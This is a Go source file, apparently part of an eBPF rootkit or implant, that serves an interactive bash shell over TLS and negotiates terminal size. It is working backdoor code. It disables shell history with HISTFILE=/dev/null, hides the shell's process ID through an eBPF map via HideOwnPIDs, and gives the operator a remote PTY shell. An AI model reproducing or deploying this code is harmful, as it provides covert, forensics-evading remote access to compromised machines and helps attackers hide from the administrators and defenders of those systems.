// TLS PTY session handler: launches interactive shell over TLS, manages terminal size and I/O
// Handler de session PTY TLS : lance un shell interactif via TLS, gère la taille du terminal et les flux I/O
package core

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"io"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"

	"github.com/creack/pty"
)

// Handle a TLS PTY session: start bash, negotiate terminal size, and relay I/O
// Gère une session PTY TLS : démarre bash, négocie la taille du terminal, relaie les flux I/O
func (b *NetstackBridge) handleTLSPTYSession(tlsConn *tls.Conn, _ string) {
	defer tlsConn.Close()

	cmd := exec.Command("/bin/bash", "-l", "-i")

	cmd.Env = []string{
		"TERM=xterm-256color",
		"SHELL=/bin/bash",
		"HOME=" + os.Getenv("HOME"),
		"USER=" + os.Getenv("USER"),
		"PATH=" + os.Getenv("PATH"),
		"PWD=" + os.Getenv("PWD"),
		"LANG=en_US.UTF-8",
		"LC_ALL=en_US.UTF-8",
		"PS1=\\[\\033[01;32m\\]grogu@tls\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[00m\\]\\$ ",
		"HISTFILE=/dev/null",
	}

	ptmx, err := pty.Start(cmd)
	if err != nil {
		fmt.Printf("❌ Failed to start PTY: %v\n", err)
		return
	}

	// Hide dynamically the PID of the shell in the eBPF map
	go func(pid int) {
		_, _, err := HideOwnPIDs(pid)
		if err != nil {
			fmt.Printf("⚠️ Error hiding PID for bash: %v\n", err)
		}
	}(cmd.Process.Pid)

	defer func() {
		fmt.Printf("🧹 Cleaning up TLS PTY session...\n")
		ptmx.Close()
		if cmd.Process != nil {
			fmt.Printf("🧹 Terminating bash process (PID: %d)\n", cmd.Process.Pid)
			cmd.Process.Kill()
			cmd.Wait()
			fmt.Printf("✅ Bash process cleaned up\n")
		}
	}()

	// Query client for terminal size using ANSI sequence
	// Interroge le client pour la taille du terminal via séquence ANSI

	// Default fallback size if query fails
	// Taille par défaut si la requête échoue
	rows, cols := 24, 80

	queryResponse := make(chan [2]int, 1)

	go func() {
		// Send ANSI query for cursor position (ESC[6n)
		// Envoie la requête ANSI pour la position du curseur
		if _, err := tlsConn.Write([]byte("\033[999;999H\033[6n")); err != nil {
			fmt.Printf("⚠️ Failed to send terminal size query via TLS: %v\n", err)
			queryResponse <- [2]int{rows, cols} // Use defaults
			return
		}

		// Read response with timeout (2s)
		// Lit la réponse avec un timeout (2s)
		timeout := time.NewTimer(2 * time.Second)
		defer timeout.Stop()

		var response []byte
		buffer := make([]byte, 256)

		for {
			select {
			case <-timeout.C:
				fmt.Printf("⏰ Terminal size query timeout, using defaults\n")
				queryResponse <- [2]int{rows, cols}
				return
			default:
				n, readErr := tlsConn.Read(buffer)
				if readErr != nil {
					if readErr != io.EOF {
						fmt.Printf("⚠️ Error reading terminal response via TLS: %v\n", readErr)
					}
					queryResponse <- [2]int{rows, cols}
					return
				}

				if n > 0 {
					data := buffer[:n]
					response = append(response, data...)

					if bytes.Contains(response, []byte("R")) {
						// Parse the response
						respStr := string(response)
						if idx := strings.Index(respStr, "\033["); idx >= 0 {
							respStr = respStr[idx+2:]
							if idx := strings.Index(respStr, "R"); idx >= 0 {
								coords := respStr[:idx]
								parts := strings.Split(coords, ";")
								if len(parts) == 2 {
									if r, err := strconv.Atoi(parts[0]); err == nil {
										if c, err := strconv.Atoi(parts[1]); err == nil {
											queryResponse <- [2]int{r, c}
											return
										}
									}
								}
							}
						}
						// If parsing failed, use defaults
						fmt.Printf("⚠️ Failed to parse terminal response: %s\n", respStr)
						queryResponse <- [2]int{rows, cols}
						return
					}
				}
			}
		}
	}()

	// Wait for terminal size response or fallback
	// Attend la réponse de taille ou utilise le fallback
	termSize := <-queryResponse
	rows, cols = termSize[0], termSize[1]

	// Ensure minimum usable size for shell
	// Assure une taille minimale utilisable pour le shell
	if rows < 10 {
		rows = 24
	}
	if cols < 40 {
		cols = 80
	}

	_ = pty.Setsize(ptmx, &pty.Winsize{Rows: uint16(rows), Cols: uint16(cols)})

	// Short pause to let shell initialize
	// Petite pause pour laisser le shell s'initialiser
	time.Sleep(100 * time.Millisecond)

	// Send alias and clear commands for better UX
	// Envoie les commandes alias et clear pour une meilleure UX
	ptmx.Write([]byte("alias ls='ls --color=auto'\n"))
	ptmx.Write([]byte("clear\n"))

	// Channel to signal session end
	// Canal pour signaler la fin de session
	done := make(chan struct{})

	// Goroutine: monitor bash process state and cleanup
	// Goroutine : surveille l'état du bash et nettoie
	go func() {
		cmd.Wait()
		fmt.Printf("📡 Bash process ended normally\n")
		select {
		case <-done:
		default:
			close(done)
		}
	}()

	// Goroutine: PTY -> TLS (shell output to client)
	// Goroutine : PTY -> TLS (sortie shell vers client)
	go func() {
		buffer := make([]byte, ptyBufferSize)
		for {
			select {
			case <-done:
				return
			default:
				n, err := ptmx.Read(buffer)
				if err != nil {
					if err == io.EOF {
						fmt.Printf("📡 PTY closed\n")
					} else {
						fmt.Printf("❌ PTY read error: %v\n", err)
					}
					select {
					case <-done:
					default:
						close(done)
					}
					return
				}

				if n > 0 {
					data := buffer[:n]

					_, _ = tlsConn.Write(data)
				}
			}
		}
	}()

	// Main loop: TLS -> PTY (client input to shell)
	// Boucle principale : TLS -> PTY (entrée client vers shell)
	buffer := make([]byte, ptyBufferSize)
	for {
		select {
		case <-done:
			fmt.Printf("📡 TLS PTY session ended\n")
			return
		default:
			n, err := tlsConn.Read(buffer)
			if err != nil {
				if err == io.EOF {
					fmt.Printf("📡 TLS connection closed\n")
				} else {
					fmt.Printf("📡 TLS read error: %v\n", err)
				}
				return
			}

			if n > 0 {
				data := buffer[:n]
				// Handle Ctrl+D to close session
				// Gère Ctrl+D pour fermer la session
				if bytes.Contains(data, []byte{4}) {
					fmt.Printf("📡 Ctrl+D received, closing PTY\n")
					return
				}

				_, err := ptmx.Write(data)
				if err != nil {
					fmt.Printf("❌ Failed to write to PTY: %v\n", err)
					return
				}
			}
		}
	}
}
